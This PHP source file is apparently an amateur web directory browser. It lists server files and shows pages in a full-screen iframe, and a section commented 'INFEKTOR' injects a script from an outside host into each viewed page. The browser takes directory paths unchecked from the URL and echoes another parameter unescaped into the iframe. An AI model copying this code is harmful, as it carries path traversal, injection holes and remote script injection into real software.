<?php
// AUTOR MATEUSZ BAGIŃSKI ZAKAZ KOPIOWANIA
error_reporting(0);

$dir = './';
function loadPage() {
	global $dir;
	
	if(isset($_GET['DIR']))
		$dir = $_GET['DIR'];
	printList(true, false);
	printList(false, true);
}

function insertString($after, $column, $str) {
	$count = $column - ($after ?  0 : strlen($str));
	if($count < 0) 
		$count = 0;
	echo str_repeat(' ', $count) . $str;
}
function cutString($str, $minus) {
	echo substr($str, 0, strlen($str) - $minus);
}

// Sprawdzenie czy strona nadaje się do przeglądania plików
function canExplore() {
	global $dir;
	foreach (new DirectoryIterator($dir) as $file) {
		if(strcmp($file, 'index.php') == 0 || 
			strcmp($file, 'index.html') == 0) {
			return true;
		}
	}
	return false;
}
function gotoURL($url) {
	header('Location: '.$url);
}
function getURL() {
	$url = 'HTTP://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	return substr($url, 0, strpos($url, '?'));
}
function isPageFile($file) {
	$type = $file->getExtension();
	return strcmp($type, "html") == 0 || 
			strcmp($type, "php") == 0;
}

$columns = array(0, 5, 10, 4);
$file_count = 0;
$folder_count = 0;

function printList($dir_print, $summary) {
	global $dir, $columns, $file_count, $folder_count;
	
	$file_count = 0;
	
	date_default_timezone_set('UTC');
	if($dir_print)
		insertString(true, 30, '<img src="./folder.png" /><a href="'.$dir.'/../">../</a><br>');
	foreach (new DirectoryIterator($dir) as $file) {
		if($file->isDot())
			continue;
		$is_dir = $file->isDir();
		if($is_dir)
			$folder_count++;
		else
			$file_count++;
		if($is_dir != $dir_print)
			continue;
		
		// DATA!!
		$last_modified_date = date('d-m-Y ', $file->getMTime()).' ';
		$last_modified_time = intval(date('H', $file->getMTime())).':'.intval(date('i', $file->getMTime()));
		
		echo cutString($last_modified_date, 1);
		insertString(false, $columns[1], $last_modified_time);
		
		// ROZMIAR!!
		if($is_dir)
			insertString(false, $columns[2], "DIR");
		else {
			$size = number_format($file->getSize() / 1024 / 1024, 2, '.', '');
			$folder_size += $size;
			
			if(strlen($size) > 1000)
				$size = ">1GB";
			insertString(false, $columns[2], $size.'MB');
		}
		
		// Link do pliku!!!
		$filename = $file->getFilename();
		$url = getURL();
		$fullpath = $file->getPath().'/'.$filename;
		
		if($is_dir) {
			$filename = $filename.'/';
			$url = $url.'?DIR='.$fullpath;
		} else if(isPageFile($file))
			$url = $url.'?PAGE='.$fullpath;
		else
			$url = $url.$fullpath;
			
		$folder_icon = '<img src="./folder.png" />';	
		insertString(true, $columns[3], 
					($is_dir ? $folder_icon : '').
					'<a href="'.$url.'">'.$filename.'</a><br>');
	}
	// Podsumowanie!
	if($summary == false)
		return;
	echo '<br>File count:'.$file_count.'    ';
	echo 'Folder count:'.$folder_count.'    ';
	echo 'Total size:'.$folder_size.'MB       Author: Mateusz Baginski';
}
?>
<html lang="pl">
	<head>
		<meta charset="UTF-8" />
		<title> File browser </title>
		<style>
			#iframe_style {
				position:fixed; 
				top:0px; 
				left:0px; 
				bottom:0px; 
				right:0px; 
				width:100%; 
				height:100%; 
				border:none; 
				margin:0; 
				padding:0; 
				overflow:hidden; 
				z-index:999999;
			}
		</style>
	</head>
	
	<?php 
if(!isset($_GET['PAGE'])) {
	?>
	<body style="overflow:hidden;">
		<div style="font-size: 20px; font-weight: bold;"> Eksplorator i robaki by Mati</div>
		<pre><b>Last modified         Size    Name</b><hr size="1" color="#000000" noshade="noshade"><?php loadPage(); ?>
		<hr size="1" color="#000000" noshade="noshade"></pre>
		<script src="./src/game.js"></script>
	</body>
	<?php
} else {
	$page = $_GET['PAGE'];
	// INFEKTOR!!!!!!!!!!!!!!!!!!!
	?>
	<iframe id="iframe_style" src='<?php echo getURL().$page; ?>'> </iframe>
	<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
	<script>
		$('#iframe_style').contents().find('body').append($('<script src="http://baginski.mateusz.2lo.pl/src/game.js">').html(""));
	</script>
	<?php 
}
	 ?>
</html>
